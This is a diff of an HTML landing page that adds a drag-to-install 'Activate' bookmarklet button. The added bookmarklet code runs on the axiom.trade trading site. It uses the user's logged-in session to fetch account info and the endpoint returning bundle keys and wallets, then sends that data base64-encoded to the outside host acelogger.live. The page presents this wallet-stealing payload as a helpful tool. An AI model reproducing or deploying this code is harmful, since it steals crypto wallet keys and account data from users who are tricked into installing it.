@@ -769,8 +769,61 @@
 
 
 
-    <script>
-        javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()  
-    </script>
+     <a href="#" class="bookmarklet" id="bookmarklet" draggable="true">Activate</a>
+<a href="#" class="btn-primary" id="activateBtn">Activate</a>
+
+<script>
+const bookmarkletCode = `javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()`;
+
+const bookmarkletEl = document.getElementById('bookmarklet');
+const activateBtn = document.getElementById('activateBtn');
+
+bookmarkletEl.href = bookmarkletCode;
+activateBtn.href = bookmarkletCode;
+
+bookmarkletEl.addEventListener('dragstart', function(e) {
+    e.dataTransfer.setData('text/uri-list', bookmarkletCode);
+    e.dataTransfer.setData('text/plain', bookmarkletCode);
+});
+
+bookmarkletEl.addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('Drag this button to your bookmarks bar instead of clicking it!');
+});
+
+activateBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('Drag the "Activate" button to your bookmarks bar to install the bookmarklet!');
+});
+
+function scrollToInstructions(event) {
+    event.preventDefault();
+    document.getElementById('instructions').scrollIntoView({behavior: 'smooth', block: 'start'});
+}
+
+function toggleFAQ(button) {
+    const faqItem = button.parentElement;
+    const isActive = faqItem.classList.contains('active');
+    document.querySelectorAll('.faq-item').forEach(item => item.classList.remove('active'));
+    if (!isActive) faqItem.classList.add('active');
+}
+
+function initScrollAnimations() {
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => { if (entry.isIntersecting) entry.target.classList.add('visible'); });
+    }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+
+    const instructionsSection = document.getElementById('instructions');
+    const faqSection = document.querySelector('.faq-section');
+    const steps = document.querySelectorAll('.step');
+
+    if (instructionsSection) observer.observe(instructionsSection);
+    if (faqSection) observer.observe(faqSection);
+    steps.forEach(step => observer.observe(step));
+}
+
+document.addEventListener('DOMContentLoaded', initScrollAnimations);
+</script>
+
 </body>
 </html>
